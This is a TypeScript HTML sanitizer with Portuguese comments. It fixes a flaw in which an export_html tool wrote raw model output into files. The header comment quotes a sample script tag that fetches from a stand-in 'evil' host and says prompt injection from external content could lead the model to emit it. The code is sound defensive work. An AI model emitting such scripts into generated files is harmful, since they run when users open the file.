/**
 * H4 — Sanitizador de HTML com allowlist.
 *
 * Problema: `files.export_html` inseria `input.content` cru dentro do documento,
 * então `<script>fetch('//evil')</script>` gerado pelo modelo (ou injetado por
 * prompt injection a partir de conteúdo externo) era gravado como HTML válido e
 * executava quando o usuário abrisse o arquivo.
 *
 * Solução: allowlist de tags e atributos, remoção de conteúdo de tags perigosas,
 * bloqueio de `on*`, de `style` e de URLs com esquema não permitido.
 */

/** Tags cujo CONTEÚDO é descartado junto com a tag. */
const DROP_WITH_CONTENT = [
  "script",
  "style",
  "iframe",
  "object",
  "embed",
  "template",
  "noscript",
  "svg",
  "math",
  "form",
  "frame",
  "frameset",
  "applet",
];

/** Tags de formatação preservadas. */
const ALLOWED_TAGS = new Set([
  "a",
  "abbr",
  "b",
  "blockquote",
  "br",
  "caption",
  "cite",
  "code",
  "dd",
  "del",
  "details",
  "div",
  "dl",
  "dt",
  "em",
  "figcaption",
  "figure",
  "h1",
  "h2",
  "h3",
  "h4",
  "h5",
  "h6",
  "hr",
  "i",
  "img",
  "ins",
  "kbd",
  "li",
  "mark",
  "ol",
  "p",
  "pre",
  "q",
  "s",
  "samp",
  "small",
  "span",
  "strong",
  "sub",
  "summary",
  "sup",
  "table",
  "tbody",
  "td",
  "tfoot",
  "th",
  "thead",
  "tr",
  "u",
  "ul",
  "var",
]);

/** Atributos preservados (todos os outros são descartados). */
const ALLOWED_ATTRS = new Set([
  "href",
  "title",
  "alt",
  "colspan",
  "rowspan",
  "start",
  "lang",
  "datetime",
]);

const SAFE_URL_RE = /^(https?:|mailto:|tel:|#|\/|\.\/|\.\.\/)/i;

/** Tags sem fechamento obrigatório. */
const VOID_TAGS = new Set(["br", "hr", "img"]);

function stripDangerousBlocks(html: string): string {
  let out = html.replace(/<!--[\s\S]*?-->/g, "");
  for (const tag of DROP_WITH_CONTENT) {
    const paired = new RegExp(`<${tag}\\b[\\s\\S]*?<\\/\\s*${tag}\\s*>`, "gi");
    out = out.replace(paired, "");
    // Versões auto-fechadas ou sem fechamento (resto do documento descartado).
    const orphan = new RegExp(`<${tag}\\b[^>]*\\/?>(?![\\s\\S]*<\\/\\s*${tag})`, "gi");
    out = out.replace(orphan, "");
  }
  return out;
}

function sanitizeAttributes(rawAttrs: string): string {
  const kept: string[] = [];
  const attrRe =
    /([a-zA-Z_:][-a-zA-Z0-9_:.]*)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'`=<>]+)))?/g;

  let match: RegExpExecArray | null;
  while ((match = attrRe.exec(rawAttrs)) !== null) {
    const name = match[1].toLowerCase();
    const value = match[2] ?? match[3] ?? match[4] ?? "";

    if (name.startsWith("on")) continue;
    if (!ALLOWED_ATTRS.has(name)) continue;
    if (name === "href") {
      if (!SAFE_URL_RE.test(value.trim())) continue;
    }
    kept.push(`${name}="${value.replace(/"/g, "&quot;")}"`);
  }

  return kept.length > 0 ? ` ${kept.join(" ")}` : "";
}

/**
 * Sanitiza um fragmento/HTML completo para inserção segura em documento.
 * Preserva estrutura de formatação; remove scripts, handlers e URLs perigosas.
 */
export function sanitizeHtmlFragment(input: unknown): string {
  if (input == null) return "";
  const html = typeof input === "string" ? input : String(input);
  if (!html) return "";

  const pre = stripDangerousBlocks(html);
  const tagRe = /<\s*(\/?)\s*([a-zA-Z][a-zA-Z0-9-]*)((?:"[^"]*"|'[^']*'|[^>"'])*)>/g;

  return pre.replace(tagRe, (_full, closing: string, tagRaw: string, attrs: string) => {
    const tag = tagRaw.toLowerCase();
    if (!ALLOWED_TAGS.has(tag)) return "";
    if (closing === "/") {
      return VOID_TAGS.has(tag) ? "" : `</${tag}>`;
    }
    const selfClosing = /\/\s*$/.test(attrs);
    const cleanAttrs = sanitizeAttributes(attrs.replace(/\/\s*$/, ""));
    if (VOID_TAGS.has(tag) || selfClosing) {
      return `<${tag}${cleanAttrs}${tag === "img" || tag === "br" || tag === "hr" ? " /" : ""}>`;
    }
    return `<${tag}${cleanAttrs}>`;
  });
}
